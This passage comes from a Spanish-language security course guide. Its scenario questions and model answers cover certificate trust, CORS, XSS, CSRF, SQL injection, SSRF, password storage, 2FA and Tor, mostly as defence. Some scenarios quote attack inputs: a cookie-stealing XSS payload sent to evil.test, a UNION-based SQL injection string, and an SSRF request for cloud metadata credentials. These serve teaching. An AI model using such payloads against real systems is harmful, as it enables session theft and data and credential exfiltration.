- Monitorear Certificate Transparency y alertar ante certificados inesperados.
- Usar HSTS para evitar downgrade a HTTP y educar sobre el nombre exacto del dominio, sin confiar solo en el candado.

---

# Tema 5 · Escenario 2: La CA comprometida

**Situación.** Un atacante compromete una CA pequeña y obtiene un certificado válido para `mail.empresa.cl`. Desvía el tráfico y lo reenvía al servidor real mientras lee credenciales. Para el navegador, la sesión es válida y el candado aparece normalmente.

**a) ¿Por qué una sola CA comprometida puede emitir para cualquier dominio?**

**Respuesta.**
- **Idea central:** el navegador confía en todas las raíces de su almacén y, salvo restricciones de nombre poco usadas, cualquiera puede firmar cualquier nombre.
- **Justificación técnica:** la cadena se valida hasta una raíz confiable; si la firma y el nombre coinciden, el certificado falso es indistinguible del legítimo.
- **Consecuencia o límite:** el eslabón más débil de cientos de CAs compromete a todos los dominios; la confianza es delegada, no absoluta.

**b) Compare el compromiso de una CA con el robo de la clave privada del servidor.**

**Respuesta.**
- El robo de la clave del servidor afecta a ese nombre y se mitiga revocando su certificado y rotando la clave.
- El compromiso de una CA permite emitir certificados para muchos dominios y obliga a desconfiar de la CA o de su jerarquía.
- La revocación es más lenta y menos fiable que la expiración, así que el impacto del compromiso de la CA es mayor y más difuso.

**c) Diseñe una defensa en profundidad contra emisiones fraudulentas.**

**Respuesta.**
- Exigir Certificate Transparency y monitorear los logs para detectar certificados no solicitados.
- Publicar CAA y usar pinning a nivel de aplicación solo donde se controle el ciclo de vida y existan pines de respaldo.
- Reducir la superficie de confianza del cliente y tener un plan de respuesta que incluya revocación, rotación y comunicación.

---

# Tema 5 · Escenario 3: La revocación que nadie consulta

**Situación.** Roban un notebook con la clave privada de `pagos.empresa.cl`. El equipo revoca el certificado, pero un usuario en una red que bloquea OCSP sigue viendo el sitio como válido. El atacante puede seguir interceptando hasta que el certificado expire.

**a) ¿Por qué la revocación es un control best-effort y no una garantía?**

**Respuesta.**
- **Idea central:** el navegador suele preferir la disponibilidad y acepta el certificado si no puede consultar el estado de revocación.
- **Justificación técnica:** CRL y OCSP añaden latencia, privacidad y puntos de falla; con soft-fail, bloquear la consulta equivale a saltarse la revocación.
- **Consecuencia o límite:** un atacante puede impedir la consulta y extender la vida útil del certificado robado; la expiración sigue siendo la única barrera automática.

**b) Compare CRL, OCSP y OCSP stapling.**

**Respuesta.**
- CRL es una lista firmada que el cliente descarga; puede ser enorme y quedar desactualizada.
- OCSP consulta en línea por cada certificado; es más granular, pero lento, frágil y revela qué sitios visita el usuario.
- OCSP stapling transporta una respuesta firmada en el handshake, mejora privacidad y latencia, pero requiere que el servidor la mantenga fresca.

**c) ¿Qué estrategia reduciría la dependencia de la revocación?**

**Respuesta.**
- Emitir certificados de vida corta y renovarlos automáticamente, de modo que el certificado robado caduque pronto.
- Exigir must-staple donde sea posible y monitorear el estado de las respuestas OCSP.
- Tener un procedimiento de emergencia para rotar claves y revocar, asumiendo que algunos clientes no consultarán.

---

# Tema 5 · Escenario 4: Pinning contra CT

**Situación.** Tras un incidente de emisión fraudulenta, una empresa discute entre imponer HPKP o adoptar Certificate Transparency. Un administrador recuerda que una configuración errónea de HPKP puede dejar el sitio inaccesible durante meses.

**a) ¿Por qué el pinning detecta cambios, pero también puede causar una caída propia?**

**Respuesta.**
- **Idea central:** el pinning obliga al cliente a aceptar solo ciertas claves o CAs, y un pin equivocado o una rotación no planificada bloquea conexiones legítimas.
- **Justificación técnica:** HPKP se declaraba por cabecera y el navegador recordaba los hashes; si se perdían las claves de respaldo, no había forma de recuperar el acceso.
- **Consecuencia o límite:** el pinning no protege la primera visita y traslada el riesgo operacional al sitio; por eso HPKP fue retirado y se prefiere pinning a nivel de aplicación.

**b) Compare HPKP con Certificate Transparency.**

**Respuesta.**
- HPKP previene el uso de un certificado no pineado, pero puede romper la disponibilidad y es difícil de revertir.
- CT no impide la emisión, pero la hace visible y auditable; los navegadores rechazan certificados sin registro y los dueños monitorean.
- CT tiene menos riesgo de autobloqueo y detecta emisiones fraudulentas después del hecho, no antes de la primera conexión.

**c) ¿Cómo introduciría estas defensas sin sacrificar disponibilidad?**

**Respuesta.**
- Empezar con CAA y monitoreo de CT, sin bloquear todavía, para inventariar emisiones y ensayar alertas.
- Si se usa pinning, definir pines de respaldo, periodo de prueba y un mecanismo de despliegue gradual.
- Documentar la rotación y probar la recuperación; la mantenibilidad es parte de la seguridad del sistema.

---

# Tema 5 · Escenario 5: La renovación que no llegó

**Situación.** El certificado de un portal vence un domingo. La automatización ACME falló por un cambio de DNS y nadie revisó las alertas. El lunes miles de usuarios ven un error de TLS y el servicio queda inaccesible aunque los servidores estén sanos.

**a) ¿Por qué la expiración es un control de seguridad y a la vez un riesgo operacional?**

**Respuesta.**
- **Idea central:** la expiración limita el daño de una clave comprometida o de una validación obsoleta, pero TLS falla cerrado y no hay modo degradado.
- **Justificación técnica:** el navegador rechaza el certificado vencido aunque la cadena y el nombre sean correctos; no existe una excepción automática por urgencia.
- **Consecuencia o límite:** un descuido operacional produce una caída total; la seguridad del diseño se convierte en un punto único de falla si no se monitorea.

**b) Compare expiración, revocación y CT como mecanismos de control temporal.**

**Respuesta.**
- La expiración es automática y universal, pero lenta: puede tardar meses en surtir efecto.
- La revocación es más rápida en teoría, aunque depende de que el cliente consulte y de que el servidor esté disponible.
- CT detecta emisiones anómalas y permite reaccionar, pero no invalida el certificado por sí solo.

**c) Diseñe el proceso de renovación y mantenga la disponibilidad.**

**Respuesta.**
- Monitorear la fecha de expiración con alertas a 30, 14 y 7 días, y probar la renovación en staging.
- Usar renovación automática con reintentos y un segundo proveedor o CA de respaldo.
- Mantener un certificado de contingencia y un runbook de instalación manual; la disponibilidad exige redundancia operacional.

---

# Tema 6 · Escenario 1: Leer el banco desde otro origen

**Situación.** `attacker.com` abre un iframe oculto hacia `https://bank.com` e intenta leer el saldo con `XMLHttpRequest`. El navegador envía la solicitud con las cookies del usuario, pero bloquea la lectura de la respuesta. El atacante busca otra forma de extraer el dato.

**a) ¿Por qué la SOP permite enviar la solicitud pero impide leer la respuesta?**

**Respuesta.**
- **Idea central:** la SOP aísla la lectura entre orígenes, no la capacidad de iniciar una petición.
- **Justificación técnica:** el navegador adjunta las cookies del dominio destino y ejecuta la petición, pero marca la respuesta como opaca para el script de otro origen.
- **Consecuencia o límite:** el atacante no lee el saldo, pero puede provocar efectos secundarios; por eso la SOP no basta contra CSRF.

**b) Distinga origen, sitio y alcance de cookies.**

**Respuesta.**
- Origen es esquema, host y puerto; `https://bank.com:443` y `https://bank.com:8443` son orígenes distintos.
- Sitio suele definirse por dominio registrable (eTLD+1), de modo que `mail.bank.com` y `www.bank.com` comparten sitio.
- Las cookies se comparten por dominio y no por puerto, así que pueden cruzar orígenes del mismo sitio; la SOP no las protege entre subdominios.

**c) Diseñe una API que necesite lectura cross-origin sin abrir un agujero.**

**Respuesta.**
- Usar CORS con una lista explícita de orígenes permitidos y credenciales solo cuando sean indispensables.
- Añadir tokens CSRF y validar el origen también en el servidor, sin confiar solo en la comprobación del navegador.
- Evitar JSONP y respuestas sensibles en endpoints que acepten peticiones simples; separar la API pública de la autenticada.

---

# Tema 6 · Escenario 2: CORS que refleja cualquier origen

**Situación.** Una API responde con `Access-Control-Allow-Origin` igual al `Origin` recibido y `Access-Control-Allow-Credentials: true`. Un sitio malicioso hace una petición con cookies y lee datos privados del usuario. El equipo creía que CORS era seguro por defecto.

**a) ¿Por qué `*` con credenciales es inválido, pero reflejar el origen es peligroso?**

**Respuesta.**
- **Idea central:** el navegador rechaza `*` cuando hay credenciales, porque autorizaría a cualquier sitio; reflejar el origen simula una lista válida y autoriza a todos.
- **Justificación técnica:** con credenciales, la respuesta debe indicar un origen exacto y `Allow-Credentials: true`; el navegador compara y entrega el cuerpo si coincide.
- **Consecuencia o límite:** el servidor cree estar usando CORS legítimo, pero cualquier dominio recibe permiso para leer respuestas autenticadas.

**b) Compare una petición simple con una preflight.**

**Respuesta.**
- Una petición simple (métodos y cabeceras limitadas) se envía directamente; si CORS falla, el navegador bloquea la lectura, pero el efecto secundario ya ocurrió.
- Una preflight envía `OPTIONS` antes de la petición real y el navegador solo la envía si el servidor autoriza método y cabeceras.
- Por eso las operaciones con efectos deben exigir preflight y no confiar en que la SOP impide el envío.

**c) Corrija la configuración de CORS.**

**Respuesta.**
- Sustituir el reflejo por una lista blanca estricta y comparar el origen completo, no solo el dominio.
- No habilitar credenciales salvo que sea necesario y añadir `Vary: Origin` para evitar cachés contaminadas.
- Rechazar `Origin: null` y validar también en el servidor la autorización real del usuario, porque CORS no es un control de acceso.

---

# Tema 6 · Escenario 3: XSS en los comentarios

**Situación.** Un portal permite comentarios y almacena `<img src=x onerror="fetch('https://evil.test/?c='+document.cookie)">`. El script se ejecuta en el navegador de cada visitante con el origen del portal. `HttpOnly` protege la cookie de sesión, pero el atacante igual logra actuar.

**a) ¿Por qué XSS rompe el aislamiento que promete la SOP?**

**Respuesta.**
- **Idea central:** el código inyectado se ejecuta con el origen del sitio vulnerable, no con el del atacante.
- **Justificación técnica:** para el navegador es JavaScript legítimo de `bank.com`; puede leer el DOM y hacer peticiones same-origin con las cookies del usuario.
- **Consecuencia o límite:** la SOP no distingue código inyectado de código propio; `HttpOnly` impide leer la cookie, pero no impide actuar en nombre del usuario.

**b) Compare sanitización, `HttpOnly` y CSP.**

**Respuesta.**
- `HttpOnly` reduce el robo directo de cookies, pero no detiene peticiones autenticadas ni la manipulación del DOM.
- Escapar o sanitizar según el contexto elimina la inyección, pero un filtro casero suele fallar con contextos y codificaciones.
- CSP con nonces o hashes limita scripts y bloquea inline, aunque requiere una política bien diseñada y no corrige datos ya almacenados.

**c) Diseñe una defensa en capas para el portal.**

**Respuesta.**
- Codificar la salida según el contexto y sanitizar HTML con una biblioteca probada y listas permitidas.
- Aplicar CSP restrictiva con nonces, `HttpOnly` y `SameSite` en cookies de sesión.
- Validar archivos subidos y usar Trusted Types para reducir XSS basado en DOM; monitorear intentos y probar con payloads reales.

---

# Tema 6 · Escenario 4: CSRF en una transferencia por GET

**Situación.** El banco acepta `GET /transferir?monto=500&destino=atacante` y autoriza con la cookie de sesión. El atacante incluye esa URL en un `<img>` en su sitio. El usuario ve una imagen rota, pero la transferencia se ejecuta.

**a) ¿Por qué el navegador se convierte en un confused deputy?**

**Respuesta.**
- **Idea central:** el navegador adjunta automáticamente la cookie del banco, así que el servidor ve una petición autenticada que el usuario no autorizó.
- **Justificación técnica:** la SOP permite cargar imágenes de cualquier origen y no impide el envío; el servidor no distingue si la petición nació del sitio del banco o de un tercero.
- **Consecuencia o límite:** el ataque no necesita leer la respuesta ni robar la cookie; basta con que el usuario tenga una sesión activa.

**b) Compare `SameSite=Lax`, `SameSite=Strict` y un token CSRF.**

**Respuesta.**
- `Strict` no envía la cookie en solicitudes cross-site, pero rompe flujos como llegar desde un enlace y encontrar la sesión cerrada.
- `Lax` la envía en navegación top-level con GET; reduce el riesgo de `<img>`, pero no protege operaciones GET sensibles.
- El token CSRF ata la solicitud a la sesión y no depende del navegador; se combina con `SameSite` y no se sustituye por él.

**c) Rediseñe la operación de transferencia.**

**Respuesta.**
- Usar POST para cambios de estado y un token aleatorio de un solo uso asociado a la sesión.
- Configurar cookies `SameSite=Lax` o `Strict` y validar `Origin` o `Referer` en el servidor.
- Exigir reautenticación o confirmación para montos altos y registrar auditoría; la defensa debe cubrir también APIs y formularios ocultos.

---

# Tema 6 · Escenario 5: Clickjacking en el botón de pago

**Situación.** `attacker.com` incrusta el portal del banco en un iframe con `opacity: 0` y dibuja encima un botón de "iPhone gratis". El usuario cree hacer clic en el premio, pero pulsa el botón real de transferencia. La SOP no impide mostrar el frame.

**a) ¿Por qué el navegador interpreta ese clic como una autorización completa?**

**Respuesta.**
- **Idea central:** el navegador no sabe qué ve el usuario; registra un clic sobre el elemento que está en esa coordenada y lo trata como intención del usuario.
- **Justificación técnica:** la SOP impide leer o manipular el frame de otro origen, pero no impide incrustarlo ni superponer contenido.
- **Consecuencia o límite:** la decisión de seguridad depende de pistas visuales que el atacante controla; por eso el clic no equivale a consentimiento informado.

**b) Compare `X-Frame-Options` con CSP `frame-ancestors` y el framebusting en JavaScript.**

**Respuesta.**
- `X-Frame-Options: DENY` o `SAMEORIGIN` bloquea el framing, pero es una cabecera antigua y con soporte limitado a esos valores.
- CSP `frame-ancestors` es más expresivo: permite listar orígenes y es la recomendación moderna.
- El framebusting en JavaScript es frágil: puede ser evadido con sandbox o deshabilitando scripts, así que no debe ser la única defensa.

**c) Proteja las acciones sensibles del portal.**

**Respuesta.**
- Enviar `Content-Security-Policy: frame-ancestors 'none'` y `X-Frame-Options: DENY` como respaldo.
- Exigir confirmación explícita o reautenticación para transferencias y cambios de datos sensibles.
- Revisar la interfaz para que las acciones críticas no dependan de un clic aislado; la defensa técnica y el diseño de interacción se complementan.

---

# Preguntas rápidas · Bloque 2

**1. ¿Qué problema resuelven las SYN cookies y cuál es su costo?** Evitan guardar estado hasta el ACK codificando el estado en el ISN; a cambio pierden algunas opciones TCP y no eliminan el consumo de ancho de banda.

**2. ¿Qué garantiza TLS que TCP/IP no, y qué ataque de disponibilidad sigue funcionando?** TLS autentica al servidor y protege integridad y confidencialidad; un RST inyectado en TCP todavía puede cortar la conexión.

**3. ¿Qué detecta Certificate Transparency que un certificado válido no revela?** Detecta emisiones para un dominio aunque la cadena sea válida, porque obliga a registrar los certificados en logs públicos y auditables.

**4. ¿Por qué `Access-Control-Allow-Origin: *` no funciona con cookies y por qué reflejar el `Origin` sí es peligroso?** El navegador prohíbe `*` con credenciales; reflejar cualquier origen junto con `Allow-Credentials: true` autoriza a todos los sitios.

**5. ¿Qué diferencia hay entre `SameSite=Lax` y `SameSite=Strict` frente a CSRF?** `Lax` envía la cookie en navegación top-level con GET; `Strict` no la envía en solicitudes cross-site, pero puede romper flujos de entrada.

---

# Parte III ? Temas 7?9

---

# Tema 7 · Escenario 1: El pedido ajeno

**Situación.** La API `GET /api/v1/orders/{id}` valida el JWT y luego consulta `SELECT * FROM orders WHERE id = ?`, sin comparar `user_id`. Un atacante con cuenta propia enumera órdenes ajenas cambiando el número.

**a) ¿Por qué el chequeo de autenticación no basta y dónde debe vivir la autorización?**

**Respuesta.**
- Idea central: autenticar dice *quién eres*; autorizar dice *qué puedes tocar*. El ID de la ruta es dato controlado por el usuario.
- Justificación técnica: el fallo es IDOR/BOLA: el objeto se busca por clave primaria global y no por la tupla (recurso, sujeto). El `JWT` válido solo prueba identidad.
- Límite: arreglarlo en el frontend no sirve; la regla debe aplicarse en cada acceso al recurso, incluida la capa de datos (`WHERE id = ? AND user_id = ?`).

**b) Compara IDOR horizontal y vertical en esta misma ruta.**

**Respuesta.**
- Horizontal: misma jerarquía, otro dueño; se explota enumerando IDs y revela datos de pares.
- Vertical: se accede a una función de mayor privilegio, p. ej. `PATCH /orders/{id}/refund` que solo debería usar soporte.
- El control debe ser por objeto *y* por operación: un rol con lectura no implica escritura.

**c) Diseña una mitigación verificable y una prueba de regresión.**

**Respuesta.**
- Autorización centralizada en un middleware/política que reciba sujeto, acción y recurso; IDs internos no secuenciales (UUID) solo como defensa en profundidad.
- Enumerar rutas con parámetros y exigir que cada una declare su política; deny por defecto.
- Test automatizado: usuario A pide recursos de B y espera 404 (no 403, para no filtrar existencia).

---

# Tema 7 · Escenario 2: La consulta que arma strings

**Situación.** El buscador de cursos hace `"SELECT * FROM courses WHERE title LIKE '%" + q + "%'"`. Un usuario envía `q = ' UNION SELECT rut, password_hash FROM users --` y la respuesta lista usuarios.

**a) ¿Por qué escapar comillas manualmente es frágil frente a una consulta parametrizada?**

**Respuesta.**
- Idea central: la parametrización separa código de datos; el escapado intenta adivinar todos los contextos peligrosos.
- Justificación técnica: el driver envía el SQL ya compilado y los valores por canal aparte, así `UNION` queda como texto literal.
- Límite: los parámetros no cubren identificadores (tabla/columna) ni `ORDER BY`; esos deben validarse contra una lista blanca.

**b) Contrasta inyección SQL con inyección de comandos OS en un endpoint que genera PDFs.**

**Respuesta.**
- SQL: el intérprete es la base de datos; el daño va de lectura a modificación de datos.
- OS: si se hace `exec("wkhtmltopdf " + file)`, metacaracteres (`;`, `$()`) ejecutan comandos con los privilegios del servicio.
- Ambos comparten la causa: concatenar entrada en un lenguaje; difieren en el intérprete y en el impacto (datos vs. host).

**c) Propón defensa en profundidad para el endpoint de PDF.**

**Respuesta.**
- No usar shell: invocar el binario con lista de argumentos (`execve`) y rutas generadas por el servidor.
- Validar y canonicalizar el nombre; rechazar rutas con `..`; archivos temporales con permisos mínimos.
- Cuenta de servicio sin shell, sin red saliente y con `seccomp`/contenedor; logs de comandos ejecutados.

---

# Tema 7 · Escenario 3: El registro que confía en el cliente

**Situación.** `POST /api/signup` acepta `{"email":..., "role":"student"}` y guarda el objeto tal cual. Además, `POST /api/reset` devuelve el token de recuperación en el cuerpo de la respuesta "para facilitar el testing".

**a) ¿Qué principio de diseño inseguro se viola al aceptar `role` desde el cliente?**

**Respuesta.**
- Idea central: el servidor debe derivar campos sensibles, no aceptarlos del usuario (*mass assignment*).
- Justificación técnica: sin lista blanca de campos, el atacante escribe columnas que el flujo no pretendía exponer.
- Consecuencia: escalada de privilegios trivial; el rol debe asignarse por lógica del servidor y auditarse.

**b) Compara este caso con el token de reset filtrado: ¿son el mismo tipo de fallo?**

**Respuesta.**
- Mass assignment: confianza indebida en datos de entrada; el atacante *escribe* estado privilegiado.
- Token en la respuesta: confianza indebida en el canal y en el destinatario; el atacante *lee* un secreto.
- Comparten la raíz de diseño: supuestos no verificados sobre el cliente; se corrigen definiendo contratos explícitos.

**c) Diseña el flujo de recuperación correcto.**

**Respuesta.**
- Token aleatorio de alta entropía, almacenado como hash, de un solo uso y con expiración corta; se envía solo por correo.
- Respuesta genérica siempre igual ("si el correo existe, enviamos instrucciones") para no enumerar cuentas.
- Invalidar sesiones tras el cambio y limitar por cuenta e IP; registrar emisión y uso.

---

# Tema 7 · Escenario 4: El bucket abierto y el `latest`

**Situación.** Un servicio descarga actualizaciones desde `https://cdn.example.com/app/latest.bin` sin verificar firma. El bucket permite listar objetos y un ex-empleado aún tiene credenciales de despliegue. La app también usa una librería de parsing con CVE pública.

**a) ¿Cómo se combinan configuración insegura y componentes vulnerables en este caso?**

**Respuesta.**
- Idea central: cada fallo es grave solo; juntos dan ejecución de código en los clientes.
- Justificación técnica: bucket listable revela rutas y versiones; CVE conocida da el vector; credenciales filtradas permiten publicar el binario malicioso.
- Límite: parchear la librería no impide el reemplazo del binario; el canal de distribución también es superficie.

**b) Compara integridad de software con confidencialidad del bucket.**

**Respuesta.**
- Confidencialidad: quién puede *leer* objetos; el listado filtra estructura y versiones.
- Integridad: quién puede *cambiar* lo que se distribuye y cómo el cliente lo detecta (firma, hash, TUF).
- HTTPS protege el tránsito, no prueba el origen ni la autoría del artefacto.

**c) Propón controles concretos de distribución y de dependencias.**

**Respuesta.**
- Firmar artefactos (clave offline) y verificar firma en el updater; versiones inmutables, nunca `latest` mutable.
- Bloquear listado público, principio de mínimo privilegio y rotar credenciales; separar build de publicación.
- SBOM + escaneo continuo de dependencias, fijar versiones y actualizar con pruebas; alertas por CVE.

---

# Tema 7 · Escenario 5: El proxy que obedece

**Situación.** `POST /api/preview` recibe `{"url": "..."}` y el backend hace `fetch(url)` para generar una miniatura. Un atacante envía `http://169.254.169.254/latest/meta-data/iam/security-credentials/` y luego apunta a servicios internos.

**a) ¿Por qué una lista negra de "localhost" no detiene SSRF?**

**Respuesta.**
- Idea central: la resolución de nombres y las redirecciones ocurren *después* de la validación textual.
- Justificación técnica: `evil.com` puede resolver a `127.0.0.1`, o el destino responder `302` hacia la IP interna; también hay IPv4 mapeadas en IPv6.
- Límite: el filtro debe aplicarse a la IP resuelta y repetirse en cada salto de redirección.

**b) Compara SSRF contra el metadata service con SSRF contra un servicio interno sin auth.**

**Respuesta.**
- Metadata: roba credenciales temporales de la instancia; el impacto depende del rol IAM adjunto.
- Servicio interno: suele confiar en la red, así que el proxy actúa como autenticador involuntario.
- En ambos el backend es el *confused deputy*: usa su privilegio de red en beneficio del atacante.

**c) Diseña una mitigación en capas.**

**Respuesta.**
- Resolver DNS, validar la IP contra rangos privados/loopback/link-local y conectar a esa IP fijada (evitar rebinding).
- Egress allowlist por dominio y puerto; proxy dedicado sin acceso a la red interna; sin seguir redirecciones automáticamente.
- En cloud, exigir IMDSv2 y rol mínimo; registrar destinos y alertar por accesos a metadata.

---

# Tema 8 · Escenario 1: El hash rápido

**Situación.** La base de usuarios guarda `sha256(password)` y fue filtrada. Un atacante corre un diccionario con GPUs sobre los hashes. Dos usuarios con la misma clave tienen el mismo hash.

**a) ¿Qué aporta el salt y qué no aporta?**

**Respuesta.**
- Idea central: el salt elimina el precálculo y la igualdad entre usuarios, pero no frena la fuerza bruta por candidato.
- Justificación técnica: salt único y aleatorio por usuario obliga a atacar cada hash por separado; el costo por intento sigue siendo el de un SHA-256.
- Límite: el salt no compensa una función demasiado rápida; se necesita un KDF lento y con costo de memoria.

**b) Compara SHA-256 con Argon2id/bcrypt/scrypt frente a ataque offline con GPU.**

**Respuesta.**
- SHA-256: diseñado para velocidad; miles de millones de intentos por segundo en GPU.
- bcrypt: costo configurable, pero solo CPU y límite de 72 bytes.
- Argon2id/scrypt: costo de memoria, encarece hardware paralelo; Argon2id es la recomendación actual para passwords.

**c) Diseña el almacenamiento y la migración desde los hashes actuales.**

**Respuesta.**
- Guardar `argon2id(password, salt aleatorio)` con parámetros medidos para ~100–500 ms; salt y parámetros junto al hash.
- Rehash transparente al iniciar sesión cuando el formato o costo sean antiguos.
- Para hashes sin salt ya filtrados, forzar reset; no "salar" en masa sin cambiar la credencial.

---

# Tema 8 · Escenario 2: El oráculo del login

**Situación.** `POST /login` responde "usuario no existe" o "contraseña incorrecta" y no tiene límite de intentos. Un atacante prueba 10 millones de pares usuario/clave desde una botnet y también enumera correos registrados.

**a) ¿Por qué el mensaje de error y el tiempo de respuesta son un canal lateral?**

**Respuesta.**
- Idea central: la diferencia observable permite distinguir existencia de cuenta sin autenticar.
- Justificación técnica: consultar usuario y luego verificar hash tarda más que fallar en la búsqueda; el texto distingue ambos caminos.
- Consecuencia: enumeración de usuarios que habilita phishing dirigido y *credential stuffing*.

**b) Compara rate limiting por IP, por cuenta y por dispositivo.**

**Respuesta.**
- Por IP: frena scripts simples, pero la botnet distribuida lo diluye y NAT compartido castiga a inocentes.
- Por cuenta: protege la cuenta objetivo, pero permite *lockout* como ataque de denegación.
- Por dispositivo/credencial: detecta reutilización entre sitios; conviene combinar señales y usar backoff, no bloqueo duro.

**c) Diseña defensas para login y recuperación.**

**Respuesta.**
- Respuesta y tiempo uniformes; comparar contra un hash ficticio cuando el usuario no existe.
- Backoff exponencial + CAPTCHA adaptativo + detección de credenciales filtradas; notificar inicios anómalos.
- MFA resistente a phishing para cuentas sensibles; monitorear picos y bloquear por riesgo, no solo por conteo.

---

# Tema 8 · Escenario 3: El código que llegó por SMS

**Situación.** Un banco usa códigos de 6 dígitos por SMS como segundo factor. Un atacante convence a la operadora de portar el número de la víctima (SIM swap) y además monta una página clonada que pide usuario, clave y código en tiempo real.

**a) ¿Qué supuesto de seguridad del SMS falla en el SIM swapping?**

**Respuesta.**
- Idea central: el SMS autentica el *número*, no la persona ni el dispositivo; el número es un identificador portable y recuperable.
- Justificación técnica: la portabilidad y el soporte telefónico permiten transferir la línea con ingeniería social; el atacante recibe los códigos.
- Límite: no hay cifrado ni autenticación de extremo a extremo; el canal depende de terceros.

**b) Compara SMS, TOTP y U2F frente a phishing y robo de línea.**

**Respuesta.**
- SMS: vulnerable a SIM swap e interceptación; no resiste phishing en tiempo real.
- TOTP: no depende de la operadora, pero el usuario puede dictar el código al sitio falso.
- U2F/WebAuthn: el navegador vincula la credencial al origen; un sitio clonado no recibe una firma válida.

**c) Diseña una migración razonable desde SMS.**

**Respuesta.**
- Ofrecer passkeys/WebAuthn como factor preferente y TOTP como respaldo; mantener SMS solo como último recurso.
- Endurecer el alta: verificación presencial o por video para cambios de número; notificar y enfriar cambios 24–48 h.
- Para operaciones críticas exigir factor resistente a phishing, no solo "un segundo factor".

---

# Tema 8 · Escenario 4: La recuperación por soporte

**Situación.** Un usuario perdió su segundo factor. Soporte valida identidad con preguntas como "ciudad de nacimiento" y, si el cliente insiste, restablece el 2FA tras una llamada. Un atacante reunió esos datos en redes sociales y logró el reset.

**a) ¿Por qué la recuperación suele ser el eslabón más débil del 2FA?**

**Respuesta.**
- Idea central: el 2FA protege el login, pero el canal de recuperación redefine quién puede saltárselo.
- Justificación técnica: si soporte restablece el factor con datos públicos, el atacante ataca a la persona, no el protocolo.
- Límite: ningún factor fuerte sirve si existe un camino alternativo más débil y no auditado.

**b) Compara recuperación por email, por soporte y por códigos de respaldo.**

**Respuesta.**
- Email: hereda la seguridad del correo; si está comprometido, cae toda la cuenta.
- Soporte: flexible pero dependiente de criterio humano y presionable por ingeniería social.
- Códigos de respaldo: offline, de un solo uso; buenos si se generan y guardan bien, pero se pierden o filtran.

**c) Diseña un proceso de recuperación resistente.**

**Respuesta.**
- Códigos de respaldo de un solo uso + varios factores registrados (passkeys en dispositivos distintos) para autorrecuperación.
- Reset asistido con verificación multifuente, demora obligatoria, notificación a canales previos y doble aprobación.
- Auditar cada reset, limitar frecuencia y registrar quién lo autorizó; métricas de abuso.

---

# Tema 8 · Escenario 5: El segundo factor compartido

**Situación.** Una empresa exige TOTP, pero los usuarios comparten un secreto en una planilla para no perder acceso y varios lo tienen en el mismo gestor sincronizado a la nube. Además, el alta de un nuevo dispositivo solo pide la contraseña.

**a) ¿Qué problema crea un secreto TOTP compartido o sincronizado?**

**Respuesta.**
- Idea central: el segundo factor deja de ser "algo que tengo en un dispositivo" y pasa a ser un secreto replicable.
- Justificación técnica: quien obtiene el seed genera códigos válidos indefinidamente; el servidor no distingue dispositivos.
- Consecuencia: un compromise del gestor o de la planilla anula el 2FA de varios usuarios a la vez.

**b) Compara TOTP con WebAuthn en origen, phishing y multi-dispositivo.**

**Respuesta.**
- TOTP: independiente del origen, así que un sitio falso puede reenviar el código; el seed es copiable.
- WebAuthn: la credencial está ligada al origen (RP ID) y la clave privada no sale del autenticador; resiste phishing.
- Multi-dispositivo: TOTP se replica trivialmente; WebAuthn requiere registrar cada dispositivo con verificación.

**c) Diseña el enrolamiento y uso multi-dispositivo.**

**Respuesta.**
- Alta de factor nuevo exige sesión reciente + factor existente; notificar y permitir revocar dispositivos.
- Guardar por usuario varios autenticadores con nombre y último uso; límite y auditoría de altas.
- Evitar secretos compartidos; si se usan TOTP, almacenar seeds cifrados y separados de la contraseña.

---

# Tema 9 · Escenario 1: El circuito no es el stream

**Situación.** Un usuario abre tres pestañas por Tor: un foro, su correo y una búsqueda. Un observador en el sitio del foro y otro en el proveedor de correo intentan vincular las tres actividades.

**a) ¿Por qué Tor separa circuitos y streams, y qué implica para el anonimato?**

**Respuesta.**
- Idea central: el circuito es el camino cifrado de tres saltos; los streams son conexiones TCP multiplexadas sobre él.
- Justificación técnica: streams al mismo destino pueden compartir circuito; el guard y los relays ven el circuito, no el contenido.
- Límite: reutilizar un circuito para sitios distintos permite correlación por tiempo y volumen si un relay es observado.

**b) Compara riesgo de correlación de timing con el de fingerprinting del navegador.**

**Respuesta.**
- Timing/volumen: el adversario ve patrones de paquetes en extremos y los empareja estadísticamente.
- Fingerprinting: el sitio identifica al cliente por características del navegador, sin necesitar la red.
- El primero rompe el anonimato de red; el segundo, el de aplicación; Tor Browser uniformiza lo segundo, no lo primero.

**c) Diseña una política de uso para reducir correlación.**

**Respuesta.**
- Separar identidades en perfiles/instancias distintas y evitar logins cruzados.
- No mezclar actividades sensibles y no sensibles en la misma ventana; usar *New Identity* para cortar vínculos.
- Evitar descargas y extensiones; entender que el circuito por sí solo no impide correlación de extremos.

---

# Tema 9 · Escenario 2: El guard que todos eligen

**Situación.** Un usuario configura un cliente Tor antiguo que permite elegir guard nodes manualmente y siempre usa el mismo relay. Un adversario opera varios guards y quiere aumentar la probabilidad de ser el primero del circuito.

**a) ¿Por qué el guard node es crítico para el anonimato a largo plazo?**

**Respuesta.**
- Idea central: el guard es el único relay que ve la IP real y se mantiene estable por meses.
- Justificación técnica: rotar guards frecuentemente multiplica las oportunidades de que un adversario entre al conjunto observado.
- Límite: si el adversario controla el guard, ve el inicio del circuito y puede correlacionar con el sitio.

**b) Compara elegir guard manualmente con la selección automática por el cliente.**

**Respuesta.**
- Manual: el usuario puede caer en un relay malicioso o poco confiable y romper la aleatoriedad esperada.
- Automática: el cliente fija un guard por periodo y limita rotaciones, reduciendo exposición acumulada.
- La seguridad depende de la distribución y de las reglas del protocolo, no de la preferencia del usuario.

**c) ¿Qué mitiga el ataque de guard y qué no?**

**Respuesta.**
- Mitiga: guards por defecto, pocos guards estables, familia de relays y detección de guards anómalos.
- No mitiga: cambiar de guard a menudo "por privacidad", que empeora la exposición.
- El anonimato frente a un adversario global sigue siendo un problema de correlación, no solo de elección de nodos.

---

# Tema 9 · Escenario 3: El servicio oculto

**Situación.** Un sitio de denuncias corre como onion service. El operador publica su dirección en redes y un usuario la visita. Un adversario intenta localizar el servidor y, por separado, al visitante.

**a) ¿Qué rol cumplen los puntos de introducción y de rendezvous?**

**Respuesta.**
- Idea central: el servicio se registra en puntos de introducción; el cliente arma un rendezvous y ambos se encuentran ahí.
- Justificación técnica: ni el cliente conoce la IP del servidor ni el servidor la del cliente; los circuitos terminan en el rendezvous.
- Límite: el rendezvous y los intro points ven metadatos de tiempo y volumen, no el contenido cifrado de extremo a extremo.

**b) Compara ocultar al servidor con ocultar al cliente en un onion service.**

**Respuesta.**
- Servidor: se protege su ubicación; el descriptor firmado se publica en el directorio y puede ser analizado.
